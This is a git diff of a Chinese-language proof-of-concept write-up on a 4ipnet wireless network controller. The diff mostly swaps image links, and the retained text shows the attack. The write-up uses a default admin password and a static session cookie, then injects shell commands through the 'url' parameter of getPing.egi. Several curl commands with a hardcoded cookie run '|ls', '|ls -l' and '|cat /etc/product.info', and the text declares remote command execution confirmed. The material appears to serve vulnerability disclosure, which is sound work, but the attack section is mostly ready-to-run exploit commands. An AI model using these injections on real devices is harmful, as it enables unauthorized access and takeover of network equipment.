@@ -12,36 +12,30 @@ Connection: keep-alive
 Keep-Alive: timeout=60, max=100
 Location: http://{host}/login.asp
 ```
-![upload_1ab1ac81f80c42b992f6c4fc96be40e8](https://hackmd.io/_uploads/SkdCNTVYp.png)
-
-
+![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_1ab1ac81f80c42b992f6c4fc96be40e8.png)
 
 從該網頁服務登入頁面，發現為 4ipnet 無線網路控制器
-
-![upload_247c7496749603bc7b9772d11afd7ba4](https://hackmd.io/_uploads/r1TkSTEtT.png)
-
+![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_247c7496749603bc7b9772d11afd7ba4.png)
 
 
 **查詢網路教學，取得該 IOT 預設密碼**
 
 **Web console 功能**
 系統概述
-![upload_fa6cb02d32f831033c013c4142586a4f](https://hackmd.io/_uploads/BJmbrpVF6.png)
+![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_fa6cb02d32f831033c013c4142586a4f.png)
 
 管理介面有 `Home > Utilities > Network Utilities` 功能，可透過網頁執行 ping, tracert, arping 等網路測試行為
-![upload_9925e6bd58df1d54d022f404504adbef](https://hackmd.io/_uploads/HJOzH6VFa.png)
+![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_9925e6bd58df1d54d022f404504adbef.png)
 
 ## 漏洞 PoC
 **PoC I @ Browser**
 
 前端有做 input text 檢測，驗證 input text 是否合規
-![upload_0d41715f59b4037ce1b9dcea6c9d31ce](https://hackmd.io/_uploads/BkOXBpEFT.png)
+![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_0d41715f59b4037ce1b9dcea6c9d31ce.png)
 
 改由後端下手，從 network 確認 http request 特徵
-![upload_b87e4fa1fea137d1feba67001f4ca104](https://hackmd.io/_uploads/SkeSHHp4FT.png)
-
-![upload_354d5ac2dd8284e800fa818cf166f489](https://hackmd.io/_uploads/S1fLHaVKa.png)
-
+![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_b87e4fa1fea137d1feba67001f4ca104.png)
+![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_354d5ac2dd8284e800fa818cf166f489.png)
 
 
 http request 特徵
@@ -68,20 +62,17 @@ http://{host}/getPing.egi?pid=940
 使用同 1 組帳密(admin)不論重新登入幾次，cookie 內容均不變
 :::
 
-![upload_3ecdb0b545bf10be16816293036534e8](https://hackmd.io/_uploads/SJEarpVFa.png)
-
+![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_3ecdb0b545bf10be16816293036534e8.png)
 
 
 **PoC II @ cmd**
 
 使用 curl 工具模擬 http request 存取管理介面 home page，被導入登入頁面
 
-![upload_f3925ef9b1edaae1b762ad800322d80d](https://hackmd.io/_uploads/HkUDIaVKp.png)
-
+![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_f3925ef9b1edaae1b762ad800322d80d.png)
 
 使用 curl 工具模擬 http request 並帶入上述取得 cookie，證實可使用需驗證身分授權之管理介面 home page
-
-![upload_a76b368249757b325d6f3bcc4ab24d88](https://hackmd.io/_uploads/rJEjUT4YT.png)
+![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_a76b368249757b325d6f3bcc4ab24d88.png)
 
 嘗試存取 `getPing.egi` 頁面，並將 query string 參數`url` 使用escape 特殊字元(`;`,`|`)嘗試跳脫後並注入指定 command
 
@@ -101,8 +92,7 @@ Keep-Alive: timeout=60, max=100
 Illegal Characters of URL.
 OK%                              
 ```
-![upload_6b5b52a9a94d27f7ace8850892ba7f77](https://hackmd.io/_uploads/SkoxD6Vta.png)
-
+![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_6b5b52a9a94d27f7ace8850892ba7f77.png)
 
 **Attemp II with `|`**
 成功跳脫!!! 並取得 `pid`!!!
@@ -120,21 +110,20 @@ Keep-Alive: timeout=60, max=100
 
 3704%      
 ```
-![upload_77cdaa3fe2e0c85b8506ec8aa926a65b](https://hackmd.io/_uploads/B1HBwaNKp.png)
-
+![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_77cdaa3fe2e0c85b8506ec8aa926a65b.png)
 
 注入`ls` 列出當前目錄
 ```zsh!
  curl -i -b "username=admin; password=17lgP6vqCV1Ko" "http://{host}/getPing.egi?url=|ls"
  ```
- ![upload_686276a082e16b2f204e75e987d55b0f](https://hackmd.io/_uploads/B1htDTNYa.png)
+![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_686276a082e16b2f204e75e987d55b0f.png)
 
 注入`ls -l` 列出當前目錄結構，檔案權限,檔案類型，修改日期等資訊
 ```zsh!
  curl -i -b "username=admin; password=17lgP6vqCV1Ko" "http://{host}/getPing.egi?url=|ls%20-l"
  ```
- 
- ![upload_caee4f89b8ef4271c2f50521c479fe61](https://hackmd.io/_uploads/rysCvpNt6.png)
+![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_caee4f89b8ef4271c2f50521c479fe61.png)
+
 
 :::success
 證實該產品存在遠端程式碼執行(RCE)漏洞， 可透過傳入`url` parameter: input_text + pipe + command 執行任意指令
@@ -145,8 +134,7 @@ Keep-Alive: timeout=60, max=100
 ```zsh!
 curl -b "username=admin; password=17lgP6vqCV1Ko" "{host}/getPing.egi?url=|cat%20/etc/product.info"
 ```
-![upload_c8581cfbd913fe193766cbad839cefc7](https://hackmd.io/_uploads/H1DZ_aEtT.png)
-
+![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_c8581cfbd913fe193766cbad839cefc7.png)
 ## Reference
 https://hkitblog.com/12770/
 https://www.lienshen.com.tw/sidebar1_01-2-11.html
